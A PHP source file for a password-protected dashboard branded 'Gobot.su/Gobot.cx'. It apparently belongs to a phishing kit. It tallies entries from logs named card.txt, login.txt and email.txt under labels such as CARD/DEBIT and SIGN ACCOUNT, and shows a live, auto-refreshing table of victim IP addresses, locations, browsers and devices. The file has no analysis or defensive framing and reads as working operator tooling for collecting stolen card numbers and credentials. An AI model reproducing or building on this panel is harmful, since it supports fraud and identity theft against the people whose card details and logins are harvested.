<?php
session_start();

if (!isset($_SESSION['username'])) {
    header('Location: login');
    exit;
}

$logFile = __DIR__ . '/../logs/ips.txt';

$rows = [];
if (file_exists($logFile)) {
    $all = file($logFile, FILE_IGNORE_NEW_LINES | FILE_SKIP_EMPTY_LINES);
    $all = array_reverse($all);
    $rows = array_map(fn($line) => array_pad(explode('|', $line), 9, 'N/A'), $all);
}
?>
<!DOCTYPE html>
<html lang="en">

<head>
<meta charset="utf-8" />
<title>Gobot.su/Gobot.cx | Dashboard</title>
<meta name="viewport" content="width=device-width, initial-scale=1" />
<meta name="description" content="" />
<meta name="author" content="" />

<link href="assets/css/vendor.min.css" rel="stylesheet" />
<link href="assets/css/app.min.css" rel="stylesheet" />


<link href="assets/plugins/jvectormap-next/jquery-jvectormap.css" rel="stylesheet" />
<style>
#logArea tbody {
    display: block;
    max-height: 300px; /* Sesuaikan tinggi sesuai kebutuhan */
    overflow-y: auto;
}

#logArea thead, #logArea tbody tr {
    display: table;
    width: 100%;
    table-layout: fixed;
}


</style>
</head>
<body>

<div id="app" class="app">

<?php

include 'include/nav.php';

?>

<?php

include 'include/sidebar.php';

?>




<button class="app-sidebar-mobile-backdrop" data-toggle-target=".app" data-toggle-class="app-sidebar-mobile-toggled"></button>


<div id="content" class="app-content">

<div class="row">

<div class="col-xl-3 col-lg-6">

<div class="card mb-3">

<div class="card-body" id="siteVisitors">

<div class="d-flex fw-bold small mb-3">
<span class="flex-grow-1">SITE VISITORS</span>
<a href="#" data-toggle="card-expand" class="text-white text-opacity-50 text-decoration-none"><i class="bi bi-fullscreen"></i></a>
</div>


<div class="row align-items-center mb-2">
<div class="col-7">
<h3 class="mb-0">0</h3>
</div>
</div>
</div>
</div>
</div>


<div class="col-xl-3 col-lg-6">

<div class="card mb-3">

<div class="card-body" id="cardDebit">

<div class="d-flex fw-bold small mb-3">
<span class="flex-grow-1">CARD/DEBIT</span>
<a href="#" data-toggle="card-expand" class="text-white text-opacity-50 text-decoration-none"><i class="bi bi-fullscreen"></i></a>
</div>


<div class="row align-items-center mb-2">
<div class="col-7">
<h3 class="mb-0">0</h3>
</div>
</div>
</div>
</div>
</div>


<div class="col-xl-3 col-lg-6">

<div class="card mb-3">

<div class="card-body" id="signAccount">

<div class="d-flex fw-bold small mb-3">
<span class="flex-grow-1">SIGN ACCOUNT</span>
<a href="#" data-toggle="card-expand" class="text-white text-opacity-50 text-decoration-none"><i class="bi bi-fullscreen"></i></a>
</div>


<div class="row align-items-center mb-2">
<div class="col-7">
<h3 class="mb-0">0</h3>
</div>
</div>
</div>
</div>

</div>


<div class="col-xl-3 col-lg-6">

<div class="card mb-3">

<div class="card-body" id="signEmail">

<div class="d-flex fw-bold small mb-3">
<span class="flex-grow-1">SIGN EMAIL</span>
<a href="#" data-toggle="card-expand" class="text-white text-opacity-50 text-decoration-none"><i class="bi bi-fullscreen"></i></a>
</div>


<div class="row align-items-center mb-2">
<div class="col-7">
<h3 class="mb-0">0</h3>
</div>
</div>
</div>
</div>

</div>

<div class="col-xl-12">

<div class="card mb-3">

<div class="card-body">

<div class="d-flex fw-bold small mb-3">
<span class="flex-grow-1">ACTIVITY LOG</span>
<a href="#" data-toggle="card-expand" class="text-white text-opacity-50 text-decoration-none"><i class="bi bi-fullscreen"></i></a>
</div>


<div class="table-responsive">
<table class="table table-striped table-borderless mb-2px small text-nowrap">
<thead>
    <tr>
        <th>
            Date & Time
        </th>
        <th>IP Address</th>
        <th>City</th>
        <th>State</th>
        <th>Country</th>
        <th>Browser</th>
        <th>Device</th>
        <th>Status</th>
    </tr>
</thead>
<tbody id="ips-table-body">
    <?php foreach ($rows as $cols): ?>
    <tr>
        <?php foreach ([0,1,2,3,4,5,6,8] as $i): ?>
            <td><?= htmlspecialchars($cols[$i] ?? '', ENT_QUOTES, 'UTF-8') ?></td>
        <?php endforeach; ?>
    </tr>
    <?php endforeach; ?>
</tbody>
</table>

</div>

</div>


<div class="card-arrow">
<div class="card-arrow-top-left"></div>
<div class="card-arrow-top-right"></div>
<div class="card-arrow-bottom-left"></div>
<div class="card-arrow-bottom-right"></div>
</div>

</div>

</div>

</div>

</div>

<?php

include 'include/footer.php';

?>

<script>
const tableBody = document.getElementById('ips-table-body');
const logFile = '../logs/ips.txt';

async function refreshTable() {
    try {
        const res = await fetch(logFile + '?_=' + Date.now());
        if (!res.ok) throw new Error('File not found');

        const text = await res.text();
        const lines = text.split("\n").filter(l => l.trim() && !l.includes('<!DOCTYPE'));

        tableBody.innerHTML = '';

        lines.reverse().forEach(line => {
            const cols = line.split('|').map(s => s.trim());
            const tr = document.createElement('tr');
            [0,1,2,3,4,5,6,8].forEach(i => {
                const td = document.createElement('td');
                td.textContent = cols[i] ?? '';
                tr.appendChild(td);
            });
            tableBody.appendChild(tr);
        });
    } catch(e) {
        console.warn('ips.txt missing or not accessible');
        tableBody.innerHTML = '';
    }
}

setInterval(refreshTable, 3000);
refreshTable();
</script>

<script>
async function updateCounts() {
    const files = {
        'siteVisitors': '../logs/accept-ips.txt',
        'cardDebit': '../logs/card.txt',
        'signAccount': '../logs/login.txt',
        'signEmail': '../logs/email.txt'
    };

    for (const [id, path] of Object.entries(files)) {
        try {
            const res = await fetch(path + '?_=' + Date.now());
            let count = 0;
            if (res.ok) {
                const text = await res.text();
                count = text.split("\n").filter(line => line.trim() && !line.includes('<!DOCTYPE')).length;
            }
            document.querySelector(`#${id} h3`).textContent = count;
        } catch (e) {
            console.warn(`File missing: ${path}`);
            document.querySelector(`#${id} h3`).textContent = 0;
        }
    }
}


setInterval(updateCounts, 3000);
updateCounts();
</script>

</body>

</html>
